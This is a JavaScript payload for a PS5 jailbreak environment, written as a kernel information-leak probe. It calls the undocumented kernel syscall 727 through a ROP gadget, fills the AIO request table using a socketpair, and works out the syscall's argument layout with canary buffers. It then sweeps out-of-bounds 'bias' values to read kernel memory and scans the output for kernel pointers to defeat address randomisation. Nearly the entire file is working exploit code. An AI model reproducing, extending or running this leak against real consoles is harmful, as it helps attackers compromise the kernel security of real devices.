// leak_727_1340.js — derive 727 leak from Bagagwa write-up, DO NOT SUMMON BAGAGWA.
// Rule: no aio_multi_wait mode0 fire here. Only diagnostic calls to 727.
// Write-up recap:
//  - get_aio_debug_request_info @ 0xffffffff805c3090 (syscall 727 = 0x2D7)
//  - req low in [1, table->0x228], high (req_id>>16) < 0x80 else EINVAL
//  - copy loop @0x805c3325: dest idx bounded by count, src idx = (req_id>>16)+edx
//    scaled by 0x28 into [rax+0x20]. So high word acts as OOB bias.
//  - each element leaks dword at +0x20 + two 8-byte ptrs to userland.
// Constraint: 727 has NO libkernel_web wrapper -> no stub in X1NON tables.
//  -> In PS5.stubMode syscall(727) throws "no-stub-in-table".
//  -> Leak requires classic ROP mode (libkernel .text readable, pop rax+syscall).
// This probe: (A) reports mode, (B) grooms valid AIO ids, (C) shape discovery,
// (D) bias sweep with canary buffers. All bounded, no hangs.
(() => {
  const B=(x)=>BigInt(x), I=(x)=>BigInt.asIntN(64,x);
  const Y=331n;
  const say=(s)=>{try{log("[727] "+s);}catch(e){}};
  const notif=(s)=>{try{send_notification(("[727] "+s).slice(0,120));}catch(e){}};
  const EN=()=>{try{const m=/^(\d+)/.exec(get_error_string());return m?parseInt(m[1],10):-1;}catch(e){return -1;}};
  const EL={1:"EPERM",2:"ENOENT",9:"EBADF",12:"ENOMEM",14:"EFAULT",22:"EINVAL",35:"EAGAIN",78:"ENOSYS"};
  const J=(e)=>" errno="+e+"("+(EL[e]||"?")+")";
  const FX=(v)=>"0x"+B(v).toString(16);
  const HX=(b,n)=>{let x="";for(let i=0n;i<B(n);i++)x+=(Number(read8(b+i))<16?"0":"")+Number(read8(b+i)).toString(16)+" ";return x;};
  const HX64=(b,nq)=>{let x="";for(let i=0n;i<B(nq);i++)x+=read64(b+i*8n).toString(16)+" ";return x;};
  const SC=(tag,sc,args,desc)=>{
    const p=tag+(desc?" "+desc:"")+" ("+args.map(FX).join(",")+")";
    say(p+" ...");
    const o={r:-9999n,e:-1,ex:false,msg:""};
    try{o.r=I(syscall(sc,...args.map(a=>B(a))));if(o.r<0n)o.e=EN();}
    catch(err){o.ex=true;o.msg=String(err&&err.message||err).slice(0,80);say(p+" -> THROW "+o.msg);return o;}
    say(p+" -> "+(o.r>=0n?"ret=0x"+o.r.toString(16)+" OK":o.r+J(o.e)));
    return o;
  };

  const A_INIT=0x29En, A_SUBCMD=0x29Dn, A_DEL=0x296n, A_CANCEL=0x29An, A_DEBUG=0x2D7n;
  const MULTI_READ=0x1001n;

  say("begin fw="+(PS5.fw||"?")+" mode="+(PS5.mode||"?")+" stubMode="+PS5.stubMode);
  say("notes="+(PS5.notes||[]).join(";"));

  // ---- A: mode gate ----
  if(PS5.stubMode){
    const stubs=(typeof SYSCALL_STUBS!=="undefined"&&SYSCALL_STUBS)?SYSCALL_STUBS:null;
    const has727=stubs&&stubs["727"];
    say("stubMode ON: stubs="+(stubs?Object.keys(stubs).length:0)+" has727="+!!has727);
    say("VERDICT-PARTIAL: 727 has no libkernel_web wrapper (confirmed absent in offsets/13.XX/*), so stub chain CANNOT call it. Need classic ROP mode.");
    if(!has727){
      // still try one call to show the throw path, then abort UAF-free
      const t=SC("DEBUG_PROBE",A_DEBUG,[1n,0n],"(expect THROW no-stub)");
      say("stub throw confirmed: ex="+t.ex+" msg="+t.msg);
      notif("727: need ROP mode, stub has no wrapper");
      return;
    }
  } else if(PS5.mode!=="ROP"){
    say("mode="+PS5.mode+" -> syscall() unavailable (DIRECT). Run hello_1320 first to get ROP.");
    notif("727: no ROP, abort");
    return;
  } else {
    say("classic ROP mode -> 727 callable via pop rax+syscall gadget. Proceeding.");
  }

  // ---- B: groom valid AIO ids (no UAF, just table fill) ----
  say("B: groom 2 valid AIO multi-reads for table fill");
  const REQ_BYTES=0x28;
  const reqs=malloc(REQ_BYTES*2);
  const sv=malloc(8);
  let fdA=0n, fdB=-1n;
  const qsp=SC("SOCKETPAIR",0x35n,[1n,1n,0n,sv],"(AF_UNIX,STREAM)");
  if(qsp.r>=0n){fdA=B(Number(read32(sv)));fdB=Number(read32(sv+4n));say("socketpair fdA="+fdA+" fdB="+fdB);}
  else{say("socketpair failed, abort leak (need pending-read fd)");return;}
  for(let i=0;i<2;i++)write32(reqs+B(i*REQ_BYTES+0x20),fdA);
  const ids=malloc(8); write32(ids,0n); write32(ids+4n,0n);
  const states=malloc(8); write32(states,0n); write32(states+4n,0n);
  const sub=SC("SUBMIT_CMD",A_SUBCMD,[MULTI_READ,reqs,2n,3n,ids],"(MULTI_READ x2)");
  const id0=Number(read32(ids)), id1=Number(read32(ids+4n));
  say("ids: "+FX(id0)+" "+FX(id1)+" submit="+(sub.r>=0n?"OK":"fail"));
  if(sub.r<0n||id0===0&&id1===0){say("no valid ids -> 727 table empty, shape probes still valid but leak sweep meaningless");}

  // ---- C: shape discovery (safe, count small, canary bufs) ----
  say("C: shape discovery, 2-arg vs 3-arg");
  const OUT=0x200;
  const out=malloc(OUT);
  const snap=()=>{const a=[];for(let i=0n;i<B(OUT);i+=8n)a.push(read64(out+i));return a;};
  const reset=()=>{for(let i=0n;i<B(OUT);i+=8n)write64(out+i,0xDEADBEEF00000000n+i);};
  const diff=(s)=>{let d=0;for(let i=0n,k=0;i<B(OUT);i+=8n,k++){try{if(read64(out+i)!==s[k])d++;}catch(e){}}return d;};
  reset();
  // C1: (0,0) expect EINVAL/EFAULT, no write
  SC("D_00",A_DEBUG,[0n,0n],"(0,0)");
  // C2: (valid_id, out) 2-arg hypothesis
  reset(); const s0=snap();
  const c2=SC("D_2ARG",A_DEBUG,[B(id0||1),out],"("+FX(id0||1)+",out)");
  say("C2 buf changed words="+diff(s0)+" head64: "+HX64(out,8));
  // C3: (valid_id, 1, out) 3-arg (id,count,out)
  reset(); const s1=snap();
  const c3=SC("D_3ARG",A_DEBUG,[B(id0||1),1n,out],"("+FX(id0||1)+",1,out)");
  say("C3 buf changed words="+diff(s1)+" head64: "+HX64(out,8));
  // C4: (valid_id, out, 1) alt order
  reset(); const s2=snap();
  const c4=SC("D_3ARG_ALT",A_DEBUG,[B(id0||1),out,1n],"("+FX(id0||1)+",out,1)");
  say("C4 buf changed words="+diff(s2)+" head64: "+HX64(out,8));
  for(let i=0;i<50;i++){try{syscall(Y);}catch(e){}}

  // ---- D: bias sweep per write-up: req = (bias<<16 | low), low in [1,0x228] ----
  // src = base + ((bias)+edx)*0x28 ; dest idx bounded by count.
  // Try count=1..4, bias in {0,1,2,0x10,0x40}. bias>=0x80 must EINVAL.
  say("D: bias sweep (OOB read). Each element: dword@+0x20 + 2 ptrs. Looking for ffff... ptrs.");
  const low=B(id0>=1&&id0<=0x228?id0:1);
  const biases=[0,1,2,0x10,0x40];
  for(const bi of biases){
    for(const cnt of [1,2,4]){
      reset(); const sn=snap();
      const req=(B(bi)<<16n)|low;
      // use winning shape: prefer 3-arg if C3 wrote, else 2-arg
      let q;
      const c3wrote=(c3.r>=0n);
      if(c3wrote) q=SC("LEAK_b"+bi+"c"+cnt,A_DEBUG,[req,B(cnt),out],"(req="+FX(req)+",cnt="+cnt+")");
      else q=SC("LEAK_b"+bi+"c"+cnt,A_DEBUG,[req,out],"(req="+FX(req)+",out) cntLane="+cnt);
      const ch=diff(sn);
      // scan for kernel ptrs: top 16 bits ffff
      let kptrs=[];
      for(let i=0n;i<B(OUT);i+=8n){try{const v=read64(out+i);if((v>>48n)===0xffffn)kptrs.push(i.toString()+"="+v.toString(16));}catch(e){}}
      say("D bias="+bi+" cnt="+cnt+" ret="+(q.ex?"EX":q.r.toString())+" changed="+ch+" kptrs(" +kptrs.length+")="+kptrs.slice(0,6).join(" "));
      if(ch>0) say("  dump: "+HX64(out,8));
      for(let i=0;i<30;i++){try{syscall(Y);}catch(e){}}
      if(kptrs.length>=2){say("LEAK-CANDIDATE bias="+bi+" cnt="+cnt+" shape="+(c3wrote?"3arg":"2arg")+" -> keep sweeping for slide");notif("727 leak candidate");}
      // also try 3-arg-alt (req,out,cnt) — real ABI may bound dest by count in arg3
      reset(); const sn2=snap();
      const q2=SC("LEAK3_b"+bi+"c"+cnt,A_DEBUG,[req,out,B(cnt)],"(req="+FX(req)+",out,cnt="+cnt+")");
      const ch2=diff(sn2);
      let kp2=[];
      for(let i=0n;i<B(OUT);i+=8n){try{const v=read64(out+i);if((v>>48n)===0xffffn)kp2.push(i.toString()+"="+v.toString(16));}catch(e){}}
      say("D3 bias="+bi+" cnt="+cnt+" ret="+(q2.ex?"EX":q2.r.toString())+" changed="+ch2+" kptrs("+kp2.length+")="+kp2.slice(0,6).join(" "));
      if(ch2>0) say("  dump3: "+HX64(out,8));
    }
  }
  // D2: bound check bias>=0x80 must fail
  reset();
  SC("BOUND_HIGH",A_DEBUG,[(0x80n<<16n)|low,out],"(bias=0x80 must EINVAL)");
  say("D2 bound check done. If above returned OK, bounds differ on 13.40 - report log.");

  // ---- cleanup (no osem, no wait fire) ----
  SC("CANCEL",A_CANCEL,[ids,2n,states],"(cleanup)");
  SC("DELETE",A_DEL,[ids,2n,states],"(cleanup)");
  try{syscall(SYSCALL.close,fdA);}catch(e){}
  try{syscall(SYSCALL.close,fdB);}catch(e){}
  say("PAYLOAD DONE (no UAF fired)");
})();
